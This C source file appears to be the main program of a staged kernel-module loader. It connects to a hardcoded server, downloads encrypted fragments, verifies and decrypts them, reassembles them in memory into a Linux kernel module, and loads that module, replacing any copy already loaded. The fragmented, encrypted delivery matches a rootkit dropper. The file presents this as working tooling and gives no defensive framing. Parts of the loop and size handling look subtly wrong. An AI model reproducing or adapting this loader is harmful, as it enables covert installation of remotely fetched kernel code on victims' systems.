#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#include "../include/fraction.h"
#include "../include/http.h"
#include "../include/sock.h"
#include "../include/utils.h"
#include "../include/log.h"
#include "../include/cipher.h"
#include "../include/load.h"


#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "8000"
#define SYS_init_module  __NR_init_module

/* Helper functions to assist with cleanup, I hate cleanup */
static void cleanup_char_array(char **array, int n_elem) {
  for (int i = 0; i < n_elem; i++) {
    free(array[i]);
  }
  free(array);
}

static void cleanup_fraction_array(fraction_t *array, int n_elem) {
  for (int i = 0; i < n_elem; i++) {
    fraction_free(&array[i]);
  }
  free(array);
}

int main(void) {
  struct addrinfo hints, *ainfo;
  int sfd = -1; // to be extra professional
  http_res_t http_fraction_res = {0};
  http_res_t http_post_res = {0};
  char **fraction_links = NULL;
  fraction_t *fractions = NULL;
  unsigned char *module = NULL;
  ssize_t total_size;
  ssize_t module_size = 0;
  decrypted *decrstr = NULL;

  log_set_level(LOG_DEBUG);
  setup_hints(&hints);

  if (h_getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &ainfo) != 0) {
    log_error("Failed to resolve server address\n");
    return EXIT_FAILURE;
  }

  printf("Connecting to: %s:%s\n", SERVER_IP, SERVER_PORT);
  sfd = create_sock_and_conn(ainfo);
  if (sfd == -1) {
    log_error("Failed to create socket and connect\n");
    return EXIT_FAILURE;
  }
  freeaddrinfo(ainfo);

  if (http_get(sfd, "/", &http_fraction_res) != HTTP_SUCCESS) {
    log_error("Failed to retrieve fraction links\n");
    goto cleanup;
  }

  int num_links = count_lines(http_fraction_res.data) + 1;
  fraction_links = calloc(num_links,sizeof(char *));
  if (!fraction_links) {
    log_error("Failed to allocate memory for fraction links\n");
    goto cleanup;
  }

  int lines_read =
      split_fraction_links(http_fraction_res.data, fraction_links, num_links);
  if (lines_read < 0) {
    log_error("Failed to split fraction links\n");
    goto cleanup;
  }


  fractions = malloc(lines_read * sizeof(fraction_t));
  if (!fractions) {
    log_error("Failed to allocate memory for fractions\n");
    goto cleanup;
  }

  for (int i = 0; i < lines_read; i++) {
    if (download_fraction(sfd, fraction_links[i], &fractions[i]) != 0) {
      log_error("Failed to download fraction\n");
      goto cleanup;
    }
  }
  log_info("Downloaded fractions");

  qsort(fractions, lines_read, sizeof(fraction_t), compare_fractions);

  if (check_fractions(fractions, lines_read) != 0) { // if this works, s0s4 and skelly is to blame!
    log_error("Fractions check failed\n");
    goto cleanup;
  }
  log_info("Verified fractions");


  for (int i=0; i<lines_read; i++) {print_fraction(fractions[i]);}

  for (int i = 0; i < num_links; i++) {

    decrstr = decrypt_fraction( & fractions[i]);

    if (decrstr -> decryptedtext == NULL) {
      log_error("Decryption process failed");
      continue;
    }

    if (module == NULL) {
      total_size = decrstr -> text_size;
      module = malloc(total_size);
      if (module == NULL) {
        log_error("Error in memory assigning");
        break;
      }
    } else if (module_size + decrstr -> text_size > total_size) {
      total_size += decrstr -> text_size;
      unsigned char * tmp = realloc(module, total_size);
      if (tmp == NULL) {
        log_error("Memory reallocation failed");
        break;
      }
      module = tmp;
    }
    memcpy(module + module_size, decrstr -> decryptedtext, decrstr -> text_size);
    module_size += decrstr -> text_size;
  }


  int result = is_lkm_loaded("lkm");
  if(result == 1){
     remove_lkm();
     puts("Reloading module:");
     load_lkm(module, total_size);
  } else if(result == 0){
    load_lkm(module, total_size);
  } else{
    log_error("There was an error loading the LKM");

  }

  free(module);
  http_free(&http_post_res);
  http_free(&http_fraction_res);
  cleanup_char_array(fraction_links, num_links);
  cleanup_fraction_array(fractions, lines_read);

//  send_publickey(sfd,rsa);

  close(sfd);
  return EXIT_SUCCESS;

/* There's nothing to see here, move on*/
cleanup: // we accept NO comments on this. have a !nice day
  if (sfd != -1) {
    close(sfd);
  }
  if (fraction_links) {
    cleanup_char_array(fraction_links, num_links);
  }
  if (fractions) {
    cleanup_fraction_array(fractions, num_links);
  }
  if (http_fraction_res.data) {
    http_free(&http_fraction_res);
  }
  if (http_post_res.data) {
    http_free(&http_post_res);
  }
  return EXIT_FAILURE;
}
